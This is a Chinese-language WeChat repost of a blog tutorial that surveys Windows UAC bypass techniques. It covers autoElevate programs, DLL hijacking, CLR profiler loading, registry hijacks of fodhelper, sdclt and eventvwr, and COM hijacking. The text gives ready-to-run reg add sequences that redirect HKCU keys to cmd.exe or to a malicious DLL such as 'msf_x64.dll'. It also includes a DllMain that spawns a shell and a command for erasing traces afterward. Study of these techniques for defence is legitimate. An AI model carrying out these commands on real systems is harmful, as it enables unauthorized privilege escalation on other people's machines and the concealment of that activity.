##  干货|Bypass UAC 技术总结

[ 黑白之道 ](javascript:void\(0\);)

**黑白之道** ![]()

微信号 i77169

功能介绍 我们是网络世界的启明星，安全之路的垫脚石。

____

__

收录于话题

![](https://gitee.com/fuli009/images/raw/master/public/20210815101543.png)

> ******作者：ConsT27**
>
>  **原文链接：**
>
>  **https://www.const27.com**

#  **一. UAC**

用户帐户控制（User Account Control，简写作UAC)是微软公司在其[Windows
Vista](https://baike.baidu.com/item/Windows
Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。

管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。

![](https://gitee.com/fuli009/images/raw/master/public/20210815101544.png)

点击“是”，管理员就会提升到高权限再去运行该任务。

# 二. autoElevate与requestedExecutionLevel

## autoElevate

当某个EXE文件的文件清单里有<autoElevate> 元素时，当执行该文件时会默认提权执行。  
我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。  
适用范围:管理员权限以获得，要得到高权限管理员权限

一般用工具sigcheck检测

网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子

![](https://gitee.com/fuli009/images/raw/master/public/20210815101545.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210815101546.png)

这个东西很有用，是下面部分方法的前提条件

## requestedExecutionLevel

![]()

有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行

asInvoker：父进程是什么权限，此应用程序就是什么权限

requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记

![](https://gitee.com/fuli009/images/raw/master/public/20210815101547.png)

highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行

# 三. 白名单程序

除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）

# 四. Bypass UAC

## 1\. DLL劫持

reference:https://www.anquanke.com/post/id/209033  
https://www.cnblogs.com/0daybug/p/11719541.html

exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是

  * 程序所在目录

  * 系统目录即`SYSTEM32`目录

  * 16位系统目录即`SYSTEM`目录

  * `Windows`目录

  * 程序加载目录(`SetCurrentDirecctory`)

  * `PATH`环境变量中列出的目录

同时，dll加载也遵循着`Know DLLs注册表项`的机制：Know
DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLS处可以看见这些dll

![]()

在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。

如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：

（1） DLL替换：用恶意的DLL替换掉合法的DLL  
（2）
DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。  
（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL  
（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或
.exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。  
（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载  
（6）
相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。

#### 实践出真知1

这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。

![](https://gitee.com/fuli009/images/raw/master/public/20210815101548.png)

由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口

![](https://gitee.com/fuli009/images/raw/master/public/20210815101549.png)

bypassuac成功。当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。

#### 实践出真知2

这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc
eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。

我们process monitor设置过滤如下

![]()

cmd运行 mmc eventvwr.msc,查看调用

![](https://gitee.com/fuli009/images/raw/master/public/20210815101550.png)

dll搜索顺序确实是
程序目录->SYSTEM32->SYSTEM->WINDOWS->当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）->PATH目录。

我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行

但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的

## 2\. CLR加载任意DLL

CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。

至于这个dll如何给CLR，是通过修改以下环境变量实现的

    
    
    COR_ENABLE_PROFILING = 1  
      
    COR_PROFILER={CLSIDor ProgID}  
      
  
---  
  
CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。  
在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载  
net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。  
总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。

接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。  
以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径.
然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”)
那么就会蹦出来高权限cmd窗口

    
    
    REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\test\calc.dll" /f  
    REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f  
    REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f  
    mmc gpedit.msc  
      
  
---  
  
但我死活复现不起不知道为啥，我的dll这样写的

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。  
    #include "pch.h"  
    #include <iostream>  
    #include <Windows.h>  
      
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)  
    {  
        char cmd[] = "cmd.exe";  
      
        switch (fdwReason)  
        {  
        case DLL_PROCESS_ATTACH:  
            WinExec(cmd, SW_SHOWNORMAL);  
            ExitProcess(0);  
            break;  
        case DLL_THREAD_ATTACH:  
            break;  
        case DLL_THREAD_DETACH:  
            break;  
        case DLL_PROCESS_DETACH:  
            break;  
        }  
        return TRUE;  
    }  
      
  
---  
  
另外的，你还可以为COR_PROFILER_PATH设置为如\\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）

## 3\. 白名单程序

### odbcad32.exe

这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd

![](https://gitee.com/fuli009/images/raw/master/public/20210815101551.png)

成功bypass

### ![](https://gitee.com/fuli009/images/raw/master/public/20210815101552.png)

### 管理工具

之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例

操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell 以此内推，还有很多相似的管理工具可以这样利用

## 4\. 注册表劫持

### Fodhelper.exe

Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序

我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处

![]()

发现程序试图打开HKCU\Software\Classes\ms-
settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-
settings\Shell\Open,查询成功便打开其下的Command键进行查询。  
我们可以劫持注册表，往HKCU\Software\Classes\ms-
settings\shell\open\command写入恶意指令从而达到bypassuac的目的。

    
    
    reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f   
    reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f  
      
  
---  
  
我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了

然后消除痕迹

    
    
    reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command"  
      
  
---  
  
### sdclt

Win10后这个程序才有自动提升权限的能力

    
    
    reg add "HKCU\Software\Classes\Folder\shell\open\command" /d C:\Windows\System32\cmd.exe /f   
    reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f  
      
      
  
---  
  
### ![](https://gitee.com/fuli009/images/raw/master/public/20210815101554.png)

### eventvmr

    
    
    reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d C:\Windows\System32\cmd.exe /f  
      
  
---  
  
win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。

## 5\. COM劫持

和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下

    
    
    HKCU\Software\Classes\CLSID  
    HKCR\CLSID  
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\  
      
  
---  
  
以eventvwr为例

执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。

而eventvwr的这个组件一般在HKCR\CLSID找到，所以可以搜索路径劫持。

利用以下方法可以劫持（搜索路径劫持）

    
    
    reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "" /t REG_SZ /d "d:\msf_x64.dll" /f   
      
    reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "LoadWithoutCOM" /t REG_SZ /d "" /f   
      
    reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "ThreadingModel" /t REG_SZ /d "Apartment" /f   
      
    reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v "HideOnDesktop" /t REG_SZ /d "" /f   
      
    reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v "Attributes" /t REG_DWORD /d 0xf090013d /f  
      
  
---  
  
## 6\. 利用com接口

### ICMLuaUtil

### ![](https://gitee.com/fuli009/images/raw/master/public/20210815101555.png)

# 五. UACME

一个开源项目，记录了许多Bypassuac的方法。

https://github.com/hfiref0x/UACME/tree/v3.2.x

# 六. windbg调试

侵权请私聊公众号删文![]()

![](https://gitee.com/fuli009/images/raw/master/public/20210815101556.png)

![]()

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

干货|Bypass UAC 技术总结

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

